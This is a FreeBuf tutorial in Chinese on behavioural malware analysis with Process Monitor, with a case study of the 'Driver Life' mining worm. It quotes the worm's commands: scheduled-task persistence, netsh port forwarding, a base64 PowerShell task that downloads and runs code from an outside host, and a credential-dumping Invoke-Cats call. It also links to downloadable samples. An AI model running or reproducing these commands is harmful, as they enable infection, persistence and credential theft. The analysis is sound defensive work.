##  一、背景

**最近几年，伴随着数字货币的兴起，促进了经济利益驱动型黑客行为的暴增。各位做安服和应急的小伙伴不可避免的会与各种勒索病毒、挖矿病毒以及各种蠕虫病毒打交道，通过分析各大厂发的技术文章，
其主要使用逆向分析还原原始代码来了解病毒相关的功能与特征。**

但是对于没有逆向分析基础的同学，看上去会很吃力，并且单纯了解了相关病毒的特征，过段时间又出现了新的变种，导致根据原先病毒的特征与功能无法进行彻底的查杀干净。那么有没有比较好的方法，可以在不逆向的基础下还原病毒的主要行为特征，从而根据这些特征来进行处置呢？在前期的不断学习与实践中，发现可以通过ProcesMonitor这款工具来进行病毒行为的分析，当然除了ProcessMonitor外还有火绒剑以及各种工具的组合也可以实现这种效果，但是ProcesMonitor的微软原生、不需要安装、占用性能低、功能齐全等特点决定其整体分析效果相比其他软件好很多。

##  二、专杀原理

目前各大杀软与EDR厂商以及个人研究者针对不同的病毒，如Ramnit、驱动人生、Sality、飞客蠕虫都在推出自己的专杀工具，那么有没有小伙伴想过病毒专杀工具的原理呢？其实仔细想想也不复杂，其专杀的核心逻辑如下所示：

> 1\. 分析病毒的功能特征(文件行为、注册表行为、网络行为、进程操作等)，这一块是专杀的核心要点，必须把病毒的行为分析透彻
>
> 2\.
> 针对病毒的相应行为进行反制，如病毒在c:\windows\下创建了1.exe文件，专杀就是到c:\windows\下找到这个文件并删除(根据MD5判断是否是同一个文件)

说起来很简单，但是在真实的实战中，需要病毒专杀作者深入分析病毒的功能特征，并且完善相应代码来进行查杀。但是在真实的场景下存在各种问题导致专杀查杀不彻底，这个时候就需要根据其特征来进行手工清除。

##  三、核心功能

回归正题，我们来分析一下ProcessMonitor的主要功能:

> 注册表行为分析
>
> 文件行为分析
>
> 网络行为分析
>
> 进程行为分析

###  3.1 注册表行为分析

主要分析针对注册表的以下行为

> 打开注册表表项
>
> 创建注册表表项
>
> 创建注册表键值
>
> 设置注册表表项
>
> 设置注册表键值
>
> 删除注册表表项
>
> 删除注册表键值
>
> 查询注册表表项
>
> 查询注册表键值
>
> 枚举注册表表项
>
> 枚举键值
>
> ……

![](https://image.3001.net/images/20200420/1587391541_5e9dac3524bc2.jpg!small)

直接使用过滤注册表的行为，我们可以看到相关进程对注册表的操作行为。这个时候可以进行过滤，个人感觉过滤绝对是ProcessMonitor一个强大的功能。

过滤的可以针对具体的进程、操作方法、PID、结果等条件来进行单项或者组合过滤。

![](https://image.3001.net/images/20200420/1587391554_5e9dac4243b43.jpg!small)

个人感觉在实战中用的比较多的针对注册表的操作行为有：

> 枚举注册表表项与键值
>
> 创建注册表表项与键值
>
> 设置键值
>
> 删除注册表表项与键值
>
> 修改注册表键值
>
> ……

我们直接过滤regsetvalue，可以看到过滤后的信息如下：

![](https://image.3001.net/images/20200420/1587391572_5e9dac54da09c.jpg!small)

我们将其打开，可以看到其对注册表的相关操作。

![](https://image.3001.net/images/20200420/1587391580_5e9dac5ca88a3.jpg!small)

另外，也可以通过RegShot这个工具来比较注册表的变化情况，其在病毒运行前和运行后可运行一次，通过对比病毒运行前后注册表的变化来分析病毒针对注册表的操作。

###  3.2 文件行为分析

###
![](https://image.3001.net/images/20200420/1587391593_5e9dac69b1a01.jpg!small)

主要的针对文件操作的行为有：

> 创建文件
>
> 删除文件
>
> 复制文件
>
> 锁定文件
>
> 隐蔽文件
>
> 读写文件
>
> ……

###  3.3 网络行为分析

![](https://image.3001.net/images/20200420/1587391603_5e9dac733acee.jpg!small)

这一块个人感觉功能相对较弱，只能看到TCP五元组信息与应用层交互的统计信息，无法看到详细交互的内容。这一块，虽然通过流量可以看到病毒程序所连接的对方的IP、端口以及部分统计信息，但是无法深入分析其交互的具体内容。个人还是建议使用wireshark或tshark来过滤网络的流量，这样后续可以深入分析原始的内容，以了解病毒程序主要的行为特征。

###  3.4 进程与线程行为分析

这一块是病毒分析的重点，需要深入分析与关注。一般情况下，病毒程序释放的时候会创建相应的进程、线程等。相应的进程、线程会进行不同的操作。一般情况下，各种挖矿病毒除了主流的挖矿功能外，还会加上蠕虫传播的特性，这样的话会释放不同的功能模板，如SMB爆破模板、永恒之蓝漏洞利用模板、RDP爆破模板等。这里面相关进程与线程的创建与其相关的特征通过进程与线程这个功能模板都可以进行深入的分析。

![](https://image.3001.net/images/20200420/1587391617_5e9dac81445ee.jpg!small)

另外，ProcessMonitor还有一个比较好的功能特征，就是show process
tree，以树结构的形式来显示相应的进程，这个功能非常直观友好，一图胜千言，直接上图：

![](https://image.3001.net/images/20200420/1587391625_5e9dac89eab13.jpg!small)

##  四、病毒实战

###  4.1 概述

在这里面我们以前段时间比较流行的驱动人生病毒来分析其主要的功能特征，释放病毒时主要运行setup-install.exe和svchost.exe即可，相应的病毒样本如下所示：

![](https://image.3001.net/images/20200420/1587391634_5e9dac92a14a1.jpg!small)

为了验证通过使用ProcessMonitor分析病毒功能特征的完整性，我们找了吾爱破解上的一篇分析比较齐全的针对驱动人生的分析文章，相应链接如下：

> <https://www.52pojie.cn/thread-983519-1-1.html>

运行setup-install.exe和svchost.exe病毒样本以后，使用ProcessMonitor捕捉的样本保存后，我们来进行分析：

###  4.2 进程分析

**4.2.1 setup-install.exe功能分析**

直接使用show processtree的功能，可以看到setup-install.exe的主要功能如下：

![](https://image.3001.net/images/20200420/1587391642_5e9dac9a7eb74.jpg!small)

将其过滤以后，功能如下:

> #查询与启动服务
>
> sc start Schedule
>
> sc query Schedule
>
> netstart WebServers
>
> #删除原有的WebServers并创建新的WebServers定时任务
>
> start/b sc start Schedule&ping localhost≻ query
> Schedule|findstrRUNNING&&(schtasks /delete /TN WebServers /f&schtasks
> /create /rusystem /sc MINUTE /mo 50 /ST 07:00:00 /TN WebServers /tr "cmd.exe
> /cc:\windows\SysWOW64\wmiex.exe"&schtasks /run /TN WebServers)
>
> #终止svhost.exe、svhhost.exe、svvhost.exe、wmiex.exe进程
>
> taskkill/f /im svhost.exe /im svhhost.exe /im svvhost.exe & move
> /yc:\windows\temp\svvhost.exe c:\windows\temp\svchost.exe &
> delc:\windows\system32\svhhost.exe & del c:\windows\syswow64\svhhost.exe
>
> taskkill/f /im wmiex.exe
>
> #wmic删除相应的进程
>
> wmic process where "name='svhost.exe' orname='svhhost.exe' or
> name='svvhost.exe'" delete
>
> wmic process where "ExecutablePath like'%drivers%' and name='taskmgr.exe'"
> delete
>
> wmic process where "ExecutablePath like'%drivers%' and name='svchost.exe'"
> delete
>
> wmic process where "ExecutablePath like'%emp%' and name='svchost.exe'"
> delete
>
> #创建端口转发策略，将本机65531-65533端口转发到1.1.1.1的53端口
>
> netshinterface ipv6 install&netsh firewall add portopening tcp 65532 UDP
>
> netshinterface portproxy add v4tov4 listenport=65532
> connectaddress=1.1.1.1connectport=53
>
> netshfirewall add portopening tcp 65531 UDP2
>
> netshinterface portproxy add v4tov4 listenport=65531
> connectaddress=1.1.1.1connectport=53
>
> netshfirewall add portopening tcp 65533 ShareService

**4.2.2 svchost.exe功能分析**

同样，使用showprocess tree功能，可以看出，svchost.exe的主要功能如下所示：

![](https://image.3001.net/images/20200420/1587391657_5e9daca9688fa.jpg!small)

过滤相应的command，其执行的进程与命令如下所示：

> #创建防火墙策略，阻断访问本地TCP 445
>
> netuser&netsh advfirewall set allprofile state on&netsh advfirewallfirewall
> add rule name=denyy445 dir=in action=block protocol=TCP localport=445
>
> #创建名为DnsScan的定时任务，每一小时运行一次，主要运行C:\Windows\temp\svchost.exe文件
>
> schtasks/create /ru system /sc MINUTE /mo 60 /st 07:05:00 /tn DnsScan
> /tr"C:\Windows\temp\svchost.exe" /F
>
> #创建powershell定时任务，base64解码后，其脚本为IEX (New-> ObjectNet.WebClient).downloadstring('<http://v.beahh.com/v>'+$env:USERDOMAIN)
>
> schtasks/create /ru system /sc MINUTE /mo 50 /st 07:00:00
> /tn"\Microsoft\windows\Bluetooths" /tr "powershell -ep bypass
> -eSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA="/F
>
> #执行powershell加载m.ps1获取系统密码实现内网传染
>
> C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe-exec bypass
> "import-module c:\windows\temp\m.ps1;Invoke-Cats -pwds"
>
> #获取域名与用户
>
> wmicntdomain get domainname
>
> netuser

###  4.3 文件行为分析

Setup-install.exe创建ttt.exe文件，并设置隐藏属性

![](https://image.3001.net/images/20200420/1587391673_5e9dacb9e6766.jpg!small)

###  4.4 注册表行为分析

创建两个启动项

1.创建名为Ddriver启动项，加载c:\windows\SysWOW64\drivers\svchost.exe

![](https://image.3001.net/images/20200420/1587391686_5e9dacc667483.jpg!small)

2.创建名为WebServers的启动项，启动加载c:\windows\SysWOW64\wmiex.exe

![](https://image.3001.net/images/20200420/1587391696_5e9dacd0e365d.jpg!small)

###  4.5 网络行为分析

前面说过通过ProcessMonitor的网络行为分析，只能看到相应的五无组信息，无法分析到交互的数据包内容。通过分析，可以看到交互的部分连接五元组信息如下所示：

![](https://image.3001.net/images/20200420/1587391722_5e9daceaeab8d.jpg!small)

![](https://image.3001.net/images/20200420/1587391748_5e9dad0471aa5.jpg!small)

去重后，可以看到和以下域名进行通信

> 42.pl
>
> 72.52.179.174
>
> li1176-20.members.linode.com
>
> li1176-20.members.linode.com
>
> mail411.us2.mcsv.net

看了一下，网络通信这一块还有好多地址没有抓到，可能和样本释放程度有关系。大家可以在虚拟机上运行一段时间，把样本全部释放以后再分析一下。

###  4.6 对比

将样本上传到微步中，相关链接如下：

>
> [https://s.threatbook.cn/report/file/bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc/?sign=history&env=win7_sp1_enx86_office2013](https://s.threatbook.cn/report/file/bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc/?sign=history&env=win7_sp1_enx86_office2013)
>
>
> <https://s.threatbook.cn/report/file/60b6d7664598e6a988d9389e6359838be966dfa54859d5cb1453cbc9b126ed7d/?env=win7_sp1_enx86_office2013>

借用微步的一张截图来分析其行为：

![](https://image.3001.net/images/20200420/1587391771_5e9dad1b399fb.jpg!small)![](https://image.3001.net/images/20200420/1587391771_5e9dad1b46795.jpg!small)

##  五、总结

通过上面的实战可以看出，在不熟悉逆向或者因为样本对抗导致难以逆向的时候使用ProcessMonitor可以快速的分析病毒的行为，在一定程度上提高了分析的效率与质量。其具有以下特点：

> 不需要专业的逆向与反汇编技能
>
> 上手快、效果好
>
> ……

但是以下下面情况无法使用或分析不全：

> 反虚拟机
>
> 反沙箱
>
> ……

总的来说，不是一款不错的病毒分析工具。

##  六、参考

> [https://www.52pojie.cn/thread-983519-1-1.html](https://www.freebuf.com/wp-> admin/post.php?post=234417&action=edit)
>
>
> [https://s.threatbook.cn/report/file/60b6d7664598e6a988d9389e6359838be966dfa54859d5cb1453cbc9b126ed7d/?env=win7_sp1_enx86_office2013](https://www.freebuf.com/wp-> admin/post.php?post=234417&action=edit)
>
>
> [https://s.threatbook.cn/report/file/bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc/?sign=history&env=win7_sp1_enx86_office2013](https://www.freebuf.com/wp-> admin/post.php?post=234417&action=edit)

样本

> 链接：<https://pan.baidu.com/s/1fLaxstvUEDa8_r3eY4q38w>
>
> 提取码：0evl

 ***本文作者： feiniao，转载请注明来自FreeBuf.COM**  
  
  
  
  

